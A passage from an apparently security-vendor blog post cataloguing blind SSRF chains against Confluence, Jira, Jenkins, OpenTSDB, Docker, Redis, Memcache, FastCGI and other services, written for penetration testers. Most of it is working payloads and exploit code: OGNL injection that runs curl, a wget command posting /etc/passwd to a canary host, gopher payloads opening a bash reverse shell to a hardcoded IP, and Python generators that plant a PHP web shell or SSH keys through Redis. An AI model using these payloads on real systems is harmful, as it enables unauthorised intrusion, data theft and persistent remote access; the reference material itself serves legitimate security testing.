/confluence/pages/createpage-entervariables.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
/wiki/pages/createpage-entervariables.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
/pages/doenterpagevariables.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
/pages/createpage.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
/pages/templates2/viewpagetemplate.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
/pages/createpage-entervariables.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
/template/custom/content-editor?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
/templates/editor-preload-container?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
/users/user-dark-features?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
```

**SSRF Canary: Sharelinks (Confluence versions released from 2016 November and older)**

```bash
/rest/sharelinks/1.0/link?url=https://SSRF_CANARY/
```

**SSRF Canary: iconUriServlet - Confluence < 6.1.3 (CVE-2017-9506)**

[Atlassian Security Ticket OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)

```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```

## Jira

**Commonly bound ports: 80,443 (SSL),8080,8443 (SSL)**

**SSRF Canary: iconUriServlet - Jira < 7.3.5 (CVE-2017-9506)**

[Atlassian Security Ticket OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)

```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```

**SSRF Canary: makeRequest - Jira < 8.4.0 (CVE-2019-8451)**

[Atlassian Security Ticket JRASERVER-69793](https://jira.atlassian.com/browse/JRASERVER-69793)

```bash
/plugins/servlet/gadgets/makeRequest?url=https://SSRF_CANARY:443@example.com
```

## Other Atlassian Products

**Commonly bound ports: 80,443 (SSL),8080,8443 (SSL)**

**SSRF Canary: iconUriServlet (CVE-2017-9506)**:

- Bamboo < 6.0.0
- Bitbucket < 4.14.4
- Crowd < 2.11.2
- Crucible < 4.3.2
- Fisheye < 4.3.2

[Atlassian Security Ticket OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)

```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```

## OpenTSDB

**Commonly bound port: 4242**

[OpenTSDB Remote Code Execution](https://packetstormsecurity.com/files/136753/OpenTSDB-Remote-Code-Execution.html)

**SSRF Canary: curl via RCE**

```bash
/q?start=2016/04/13-10:21:00&ignore=2&m=sum:jmxdata.cpu&o=&yrange=[0:]&key=out%20right%20top&wxh=1900x770%60curl%20SSRF_CANARY%60&style=linespoint&png
```

[OpenTSDB 2.4.0 Remote Code Execution](https://github.com/OpenTSDB/opentsdb/issues/2051)

**SSRF Canary: curl via RCE - CVE-2020-35476**

```bash
/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('wget%20--post-file%20/etc/passwd%20SSRF_CANARY')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
```

## Jenkins

**Commonly bound ports: 80,443 (SSL),8080,8888**

Great writeup [here](https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html).

**SSRF Canary: CVE-2018-1000600**

```bash
/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://SSRF_CANARY/%23&login=orange&password=tsai
```

**RCE**

Follow the instructions here to achieve RCE via GET: [Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html)

```bash
/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='orange.tw', root='http://SSRF_CANARY/')%0a@Grab(group='tw.orange', module='poc', version='1')%0aimport Orange;
```

**RCE via Groovy**

```python
cmd = 'curl burp_collab'
pay = 'public class x {public x(){"%s".execute()}}' % cmd
data = 'http://jenkins.internal/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=' + urllib.quote(pay)
```

## Hystrix Dashboard

**Commonly bound ports: 80,443 (SSL),8080**

Spring Cloud Netflix, versions 2.2.x prior to 2.2.4, versions 2.1.x prior to 2.1.6.

**SSRF Canary: CVE-2020-5412**

```bash
/proxy.stream?origin=http://SSRF_CANARY/
```

## W3 Total Cache

**Commonly bound ports: 80,443 (SSL)**

W3 Total Cache 0.9.2.6-0.9.3

**SSRF Canary: CVE-2019-6715**

This needs to be a PUT request:

```bash
PUT /wp-content/plugins/w3-total-cache/pub/sns.php HTTP/1.1
Host:
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36
Content-Length: 124
Content-Type: application/x-www-form-urlencoded
Connection: close

{"Type":"SubscriptionConfirmation","Message":"","SubscribeURL":"https://SSRF_CANARY"}
```

**SSRF Canary**

The advisory for this vulnerability was released here: [W3 Total Cache SSRF vulnerability](https://klikki.fi/adv/w3_total_cache.html)

This PHP code will generate a payload for your SSRF Canary host (replace `url` with your canary host):

```php
<?php

$url='http://www.google.com';
$file=strtr(base64_encode(gzdeflate($url.'#https://ajax.googleapis.com')), '+/=', '-_');
$file=chop($file,'=');
$req='/wp-content/plugins/w3-total-cache/pub/minify.php?file='.$file.'.css';
echo($req);

?>
```

## Docker

**Commonly bound ports: 2375, 2376 (SSL)**

If you have a partially blind SSRF, you can use the following paths to verify the presence of Docker’s API:

```bash
/containers/json
/secrets
/services
```

**RCE via running an arbitrary docker image**

```http
POST /containers/create?name=test HTTP/1.1

...

{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}
```

Replace alpine with an arbitrary image you would like the docker container to run.

## Gitlab Prometheus Redis Exporter

**Commonly bound ports: 9121**

This vulnerability affects Gitlab instances before version 13.1.1. According to the [Gitlab documentation](https://docs.gitlab.com/ee/administration/monitoring/prometheus/#configuring-prometheus)`Prometheus and its exporters are on by default, starting with GitLab 9.0.`

These exporters provide an excellent method for an attacker to pivot and attack other services using CVE-2020-13379. One of the exporters which is easily exploited is the Redis Exporter.

The following endpoint will allow an attacker to dump all the keys in the redis server provided via the target parameter:

```bash
http://localhost:9121/scrape?target=redis://127.0.0.1:7001&check-keys=*
```

* * *

**Possible via Gopher**

## Redis

**Commonly bound port: 6379**

Recommended reading:

- [Trying to hack Redis via HTTP requests](https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html)
- [SSRF Exploits against Redis](https://maxchadwick.xyz/blog/ssrf-exploits-against-redis)

**RCE via Cron** \- [Gopher Attack Surfaces](https://blog.chaitin.cn/gopher-attack-surfaces/)

```bash
redis-cli -h $1 flushall
echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1\n\n"|redis-cli -h $1 -x set 1
redis-cli -h $1 config set dir /var/spool/cron/
redis-cli -h $1 config set dbfilename root
redis-cli -h $1 save
```

Gopher:

```bash
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```

**RCE via Shell Upload (PHP)** \- [Redis Getshell Summary](https://www.mdeditor.tw/pl/pBy0)

```python
#!/usr/bin/env python
# -*-coding:utf-8-*-

import urllib
protocol="gopher://"
ip="192.168.189.208"
port="6379"
shell="\n\n<?php phpinfo();?>\n\n"
filename="shell.php"
path="/var"
passwd=""

cmd=["flushall",\
     "set 1 {}".format(shell.replace(" ","${IFS}")),\
     "config set dir {}".format(path),\
     "config set dbfilename {}".format(filename),\
     "save"\
     ]
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
    cmd+=CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += urllib.quote(redis_format(x))
    print payload
```

**RCE via authorized\_keys** \- [Redis Getshell Summary](https://www.mdeditor.tw/pl/pBy0)

```python
import urllib
protocol="gopher://"
ip="192.168.189.208"
port="6379"
# shell="\n\n<?php eval($_GET[\"cmd\"]);?>\n\n"
sshpublic_key = "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8IOnJUAt5b/5jDwBDYJTDULjzaqBe2KW3KhqlaY58XveKQRBLrG3ZV0ffPnIW5SLdueunb4HoFKDQ/KPXFzyvVjqByj5688THkq1RJkYxGlgFNgMoPN151zpZ+eCBdFZEf/m8yIb3/7Cp+31s6Q/DvIFif6IjmVRfWXhnkjNehYjsp4gIEBiiW/jWId5yrO9+AwAX4xSabbxuUyu02AQz8wp+h8DZS9itA9m7FyJw8gCrKLEnM7PK/ClEBevDPSR+0YvvYtnUxeCosqp9VrjTfo5q0nNg9JAvPMs+EA1ohUct9UyXbTehr1Bdv4IXx9+7Vhf4/qwle8HKali3feIZ root@kali\n\n"
filename="authorized_keys"
path="/root/.ssh/"
passwd=""
cmd=["flushall",\
     "set 1 {}".format(sshpublic_key.replace(" ","${IFS}")),\
     "config set dir {}".format(path),\
     "config set dbfilename {}".format(filename),\
     "save"\
     ]
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
    cmd+=CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += urllib.quote(redis_format(x))
    print payload
```

**RCE on GitLab via Git protocol**

Great writeup from Liveoverflow [here](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/).

While this required authenticated access to GitLab to exploit, I am including the payload here as the `git` protocol may work on the target you are hacking. This payload is for reference.

```bash
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```

## Memcache

**Commonly bound port: 11211**

- [vBulletin Memcache RCE](https://www.exploit-db.com/exploits/37815)
- [GitHub Enterprise Memcache RCE](https://www.exploit-db.com/exploits/42392)
- [Example Gopher payload for Memcache](https://blog.safebuff.com/2016/07/03/SSRF-Tips/#SSRF-memcache-Getshell)

```bash
gopher://[target ip]:11211/_%0d%0aset ssrftest 1 0 147%0d%0aa:2:{s:6:"output";a:1:{s:4:"preg";a:2:{s:6:"search";s:5:"/.*/e";s:7:"replace";s:33:"eval(base64_decode($_POST[ccc]));";}}s:13:"rewritestatus";i:1;}%0d%0a
gopher://192.168.10.12:11211/_%0d%0adelete ssrftest%0d%0a
```

## Apache Tomcat

**Commonly bound ports: 80,443 (SSL),8080,8443 (SSL)**

Effective against Tomcat 6 only:

[gopher-tomcat-deployer](https://github.com/pimps/gopher-tomcat-deployer)

CTF writeup using this technique:

[From XXE to RCE: Pwn2Win CTF 2018 Writeup](https://bookgin.tw/2018/12/04/from-xxe-to-rce-pwn2win-ctf-2018-writeup/)

## FastCGI

**Commonly bound ports: 80,443 (SSL)**

This was taken from [here](https://blog.chaitin.cn/gopher-attack-surfaces/).

```bash
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00
```

* * *

**Tools**

## Gopherus

- [Gopherus - Github](https://github.com/tarunkant/Gopherus)
- [Blog post on Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

This tool generates Gopher payloads for:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache

## SSRF Proxy

- [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

SSRF Proxy is a multi-threaded HTTP proxy server designed to tunnel client HTTP traffic through HTTP servers vulnerable to Server-Side Request Forgery (SSRF).

* * *

Credits:

Thank you to the following people that have contributed to this post:

- [@Rhynorater - Numerous contributions towards this blog post](https://twitter.com/Rhynorater)
- [@nnwakelam - Solr Shards SSRF](https://twitter.com/nnwakelam)
- [@marcioalm - Tomcat 6 Gopher RCE](https://twitter.com/marcioalm)
- [@vtnahira - OpenTSDB RCE](https://twitter.com/vtnahira)
- [@fransrosen - SSRF canaries concept](https://twitter.com/fransrosen)
- [@theabrahack - RCE via Jenkins Groovy](https://twitter.com/@theabrahack)
- bike chain logo by Rafael Empinotti from the Noun Project

##### Share this post:

[Share on Twitter](https://twitter.com/intent/tweet?text=A+Glossary+of+Blind+SSRF+Chains%20-%20@assetnote%20-%20&url=https%3A%2F%2Fblog.assetnote.io%2F2021%2F01%2F13%2Fblind-ssrf-chains%2F "Share on Twitter") [Share on LinkedIn](http://www.linkedin.com/shareArticle?url=https%3A%2F%2Fblog.assetnote.io%2F2021%2F01%2F13%2Fblind-ssrf-chains%2F&title=A+Glossary+of+Blind+SSRF+Chains "Share on LinkedIn") [Share on Reddit](http://reddit.com/submit?url=https%3A%2F%2Fblog.assetnote.io%2F2021%2F01%2F13%2Fblind-ssrf-chains%2F&title=A+Glossary+of+Blind+SSRF+Chains "Share on Reddit") [Share on Hacker News](https://news.ycombinator.com/submitlink?u=https%3A%2F%2Fblog.assetnote.io%2F2021%2F01%2F13%2Fblind-ssrf-chains%2F&t=A+Glossary+of+Blind+SSRF+Chains "Share on Hacker News")

### See Assetnote in action

Find out how Assetnote can help you lock down your external attack surface.

Use the lead form below, or alternatively contact us via email by clicking [here.](mailto:sales@assetnote.io?subject=Hi%20-%20I%27m%20interested%20in%20Assetnote&body=Phone%20Number:%20%0AJob%20Title:%20%0ACompany:%20%0ANext%20Steps:%20ie.%20Demo,%20Further%20Documentation%0ABuying%20Cycle:%20Q1/Q2/Q3/Q4)

REQUEST A DEMO

### Thank you!

We will be in touch.

Twitter Widget Iframe